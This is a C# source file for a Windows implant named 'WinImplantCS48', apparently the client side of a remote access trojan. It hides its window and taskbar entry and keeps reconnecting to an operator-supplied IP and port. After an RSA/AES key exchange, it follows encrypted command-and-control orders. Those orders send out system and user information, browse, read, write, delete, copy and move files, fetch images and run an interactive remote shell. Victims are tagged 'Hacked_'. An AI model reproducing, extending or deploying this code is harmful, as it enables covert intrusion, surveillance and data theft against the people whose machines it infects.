using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Management;
using System.IO;

namespace WinImplantCS48
{
    public partial class frmMain : Form
    {
        private string[] m_args { get; set; }
        private string m_szIPv4 = "[REMOTE_IP]";
        private int m_nPort = 5000; //int.Parse("[REMOTE_PORT]");

        private bool m_bIsConnected = false;

        private clsfnShell m_fnShell { get; set; }
        
        //Listener
        private clsLtnTcp m_ltnTcp { get; set; }

        public frmMain(string[] args)
        {
            InitializeComponent();
            
            m_args = args;
        }

        void fnRecv(clsVictim victim, List<string> lsMsg)
        {
            if (lsMsg.Count == 0)
                return;

            List<string> vsMsg = new List<string>();
            if (lsMsg[0].StartsWith("Hacked_"))
            {
                vsMsg.AddRange(lsMsg.GetRange(1, lsMsg.Count - 1));

                clsfnInfoSpyder infoSpider = new clsfnInfoSpyder();
                string szVictimID = lsMsg[0];
                if (szVictimID != "Hacked_" + infoSpider.m_info.m_szMachineID)
                {
                    /*
                    if (g_ltpTcp != null)
                        g_ltpTcp.fnSendToSub(szVictimID, vsMsg);

                    return;
                    */
                }
                else if (szVictimID == "Hacked_" + infoSpider.m_info.m_szMachineID && lsMsg[1].StartsWith("Hacked"))
                {
                    /*
                    if (g_ltpTcp != null)
                        g_ltpTcp.fnSendToSub(szVictimID, vsMsg);

                    return;
                    */
                }
                else
                {
                    // Add any additional logic if needed
                }
            }
            else
            {
                vsMsg.AddRange(lsMsg);
            }

            if (vsMsg[0] == "info") //Information
            {
                clsfnInfoSpyder infoSpyder = new clsfnInfoSpyder();
                var stInfo = infoSpyder.m_info;

                victim.m_szVictimID = "Hacked_" + stInfo.m_szMachineID;

                string[] msg =
                {
                    "info",
                    "X",
                    stInfo.m_bHasDesktop ? "1" : "0",
                    stInfo.m_szIPv4,
                    victim.m_szVictimID,
                    stInfo.m_szUsername,
                    stInfo.m_nUid.ToString(),
                    stInfo.m_bIsRoot ? "1" : "0",
                    stInfo.m_szOSName,
                    infoSpyder.fndGetCpuUsage().ToString("F2"),
                };

                victim.fnSendCommand(msg);
            }
            else if (vsMsg[0] == "file")
            {
                clsfnFileMgr fileMgr = new clsfnFileMgr();

                if (vsMsg[1] == "init")
                {
                    victim.fnSendCommand(new string[]
                    {
                        "file",
                        "init",
                        fileMgr.m_szInitFileDir,
                    });

                    victim.fnSendCommand(new string[]
                    {
                        "file",
                        "drive",
                        clsEZData.fnszLsE2B64(fileMgr.fnlsGetDrives()),
                    });
                }
                else if (vsMsg[1] == "sd")
                {
                    var lsInfo = fileMgr.fnScandir(vsMsg[2]);
                    var ls2d = new List<List<string>>();

                    foreach (var info in lsInfo)
                    {
                        string[] ls = 
                        {
                            info.bIsDir ? "1" : "0",
                            info.szFilePath.Replace("\\", "/"),
                            info.nFileSize.ToString(),
                            info.szPermission,
                            info.szCreationDate,
                            info.szLastModified,
                            info.szLastAccessed,
                        };

                        ls2d.Add(ls.ToList());
                    }

                    victim.fnSendCommand(new string[]
                    {
                        "file",
                        "sd",
                        vsMsg[2],
                        clsEZData.fnszSend2dParser(ls2d),
                    });
                }
                else if (vsMsg[1] == "goto")
                {
                    int nCode = Directory.Exists(vsMsg[2]) ? 1 : 0;
                    victim.fnSendCommand(new string[]
                    {
                        "file",
                        "goto",
                        nCode.ToString(),
                        vsMsg[2],
                    });
                }
                else if (vsMsg[1] == "wf")
                {
                    string szFilePath = vsMsg[2];
                    string szContent = vsMsg[3];

                    var ret = fileMgr.fnWriteFile(szFilePath, szContent);
                    victim.fnSendCommand(new string[]
                    {
                        "file",
                        "wf",
                        ret.nCode.ToString(),
                        ret.szContent,
                    });
                }
                else if (vsMsg[1] == "rf")
                {
                    string szFilePath = vsMsg[2];
                    var ret = fileMgr.fnReadFile(szFilePath);
                    victim.fnSendCommand(new string[]
                    {
                        "file",
                        "rf",
                        ret.nCode.ToString(),
                        szFilePath,
                        ret.szContent,
                    });
                }
                else if (vsMsg[1] == "uf")
                {

                }
                else if (vsMsg[1] == "df")
                {

                }
                else if (vsMsg[1] == "wget")
                {

                }
                else if (vsMsg[1] == "del")
                {
                    string szPath = vsMsg[2];
                    var ret = fileMgr.fnDelete(szPath);
                    victim.fnSendCommand(new string[]
                    {
                        "file",
                        "del",
                        ret.nCode.ToString(),
                        szPath,
                        ret.szMsg,
                    });
                }
                else if (vsMsg[1] == "cp")
                {
                    string szSrcPath = vsMsg[2];
                    string szDstPath = vsMsg[3];
                    var ret = fileMgr.fnCopy(szSrcPath, szDstPath);
                    victim.fnSendCommand(new string[]
                    {
                        "file",
                        "cp",
                        ret.nCode.ToString(),
                        szSrcPath,
                        szDstPath,
                        ret.szMsg,
                    });
                }
                else if (vsMsg[1] == "mv")
                {
                    string szSrcPath = vsMsg[2];
                    string szDstPath = vsMsg[3];
                    var ret = fileMgr.fnMove(szSrcPath, szDstPath);
                    victim.fnSendCommand(new string[]
                    {
                        "file",
                        "mv",
                        ret.nCode.ToString(),
                        szSrcPath,
                        szDstPath,
                        ret.szMsg,
                    });
                }
                else if (vsMsg[1] == "img")
                {
                    string szFilePath = vsMsg[2];
                    var ret = fileMgr.fnReadImage(szFilePath);
                    victim.fnSendCommand(new string[]
                    {
                        "file",
                        "img",
                        szFilePath,
                        ret.szMsg,
                    });
                }
                else if (vsMsg[1] == "nd")
                {

                }
            }
            else if (vsMsg[0] == "proc")
            {

            }
            else if (vsMsg[0] == "srv")
            {

            }
            else if (vsMsg[0] == "shell")
            {
                if (vsMsg[1] == "start")
                {
                    if (m_fnShell == null)
                    {
                        m_fnShell = new clsfnShell(victim);
                        m_fnShell.fnStart();
                    }
                }
                else if (vsMsg[1] == "stop")
                {
                    if (m_fnShell != null)
                    {
                        m_fnShell.fnStop();
                        m_fnShell.Dispose();
                        m_fnShell = null;
                    }
                }
                else if (vsMsg[1] == "input")
                {
                    if (m_fnShell != null)
                    {
                        byte[] abData = Convert.FromBase64String(vsMsg[2]);
                        m_fnShell.fnPushInput(abData);
                    }
                }
                else if (vsMsg[1] == "resize")
                {
                    if (m_fnShell != null)
                    {
                        int nCol = int.Parse(vsMsg[2]);
                        int nRow = int.Parse(vsMsg[3]);

                        m_fnShell.fnResize(nCol, nRow);
                    }
                }
                else if (vsMsg[1] == "exec")
                {

                }
            }
            else if (vsMsg[0] == "loader")
            {

            }
            else if (vsMsg[0] == "server")
            {

            }
        }

        void fnTcpHandler(clsVictim victim)
        {
            try
            {
                clsEDP edp = null;
                int nRecv = 0;
                byte[] abStaticRecvBuffer = new byte[clsEDP.MAX_SIZE];
                byte[] abDynamicRecvBuffer = new byte[] { };

                victim.fnSendRandomString(0, 0);

                do
                {
                    abStaticRecvBuffer = new byte[clsEDP.MAX_SIZE];
                    nRecv = victim.m_sktSrv.Receive(abStaticRecvBuffer);
                    abDynamicRecvBuffer = clsEZData.fnCombineBytes(abDynamicRecvBuffer, 0, abDynamicRecvBuffer.Length, abStaticRecvBuffer, 0, nRecv);
                    if (nRecv <= 0)
                        break;
                    else if (abDynamicRecvBuffer.Length < clsEDP.HEADER_SIZE)
                        continue;
                    else
                    {
                        var head_info = clsEDP.fnGetHeader(abDynamicRecvBuffer);
                        while (abDynamicRecvBuffer.Length - clsEDP.HEADER_SIZE >= head_info.nLength)
                        {
                            edp = new clsEDP(abDynamicRecvBuffer);
                            abDynamicRecvBuffer = edp.m_abMoreData;
                            head_info = clsEDP.fnGetHeader(abDynamicRecvBuffer);

                            if (edp.m_nCommand == 0)
                            {
                                if (edp.m_nParam == 0) //DISCONNECT
                                {
                                    
                                }
                                else if (edp.m_nParam == 1) //RECONNECT (REFRESH KEY)
                                {
                                    
                                }
                            }
                            else if (edp.m_nCommand == 1) //KEY EXCHANGE
                            {
                                if (edp.m_nParam == 0) //RECEIVED RSA KEY SEND ENCRYPTED AES KEY
                                {
                                    string szb64RSAKey = Encoding.UTF8.GetString(edp.fnGetMsg().abMsg);
                                    byte[] abRSAKey = Convert.FromBase64String(szb64RSAKey);
                                    
                                    clsCrypto crypto = new clsCrypto(abRSAKey);
                                    victim.m_crypto = crypto;

                                    var aes = victim.m_crypto.fnAESGenerateKey();

                                    string szMsg = $"{Convert.ToBase64String(aes.abKey)}|{Convert.ToBase64String(aes.abIV)}";
                                    string szCipher = Convert.ToBase64String(victim.m_crypto.fnabRSAEncrypt(szMsg, abRSAKey));

                                    victim.fnSend(1, 1, szCipher);
                                }
                                else if (edp.m_nParam == 2) //CHALLENGE AND RESPONSE
                                {
                                    string szChallenge = Encoding.UTF8.GetString(edp.fnGetMsg().abMsg);
                                    string szCipher = Convert.ToBase64String(victim.m_crypto.fnabAESEncrypt(szChallenge));

                                    victim.fnSend(1, 3, szCipher);
                                }
                            }
                            else if (edp.m_nCommand == 2) //COMMAND AND CONTROL
                            {
                                if (edp.m_nParam == 0) //RECEIVED COMMAND
                                {
                                    string szMsg = Encoding.UTF8.GetString(victim.m_crypto.fnabAESDecrypt(edp.fnGetMsg().abMsg));
                                    List<string> lsMsg = szMsg.Split('|').ToList();
                                    lsMsg = clsEZData.fnLB64D2S(lsMsg);
                                    
                                    fnRecv(victim, lsMsg);
                                }
                                else if (edp.m_nParam == 1) //PIGN TIME, LATENCY
                                {
                                    //victim.encSend(2, 1, DateTime.Now.ToString("F"));
                                }
                            }
                        }
                    }
                }
                while (nRecv > 0);
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.Message);
            }

            m_bIsConnected = false;
        }

        void fnTcpConnect(string szIPv4, int nPort)
        {
            if (IPAddress.TryParse(szIPv4, out IPAddress ipv4))
            {
                Socket sktSrv = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                sktSrv.Connect(szIPv4, nPort);
                m_bIsConnected = true;

                clsVictim victim = new clsVictim(clsVictim.enMethod.TCP, sktSrv);
                new Thread(() => fnTcpHandler(victim)).Start();
            }
        }

        void fnSetup()
        {
            Visible = false;
            MinimizeBox = true;
            ShowInTaskbar = false;

            if (m_args.Length == 2)
            {
                m_szIPv4 = m_args[0];
                m_nPort = int.Parse(m_args[1]);
            }

            while (true)
            {
                try
                {
                    if (!m_bIsConnected)
                        fnTcpConnect(m_szIPv4 , m_nPort);
                }
                catch (Exception ex)
                {
                    //MessageBox.Show(ex.Message);
                }

                Thread.Sleep(1000);
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            fnSetup();
        }
    }
}
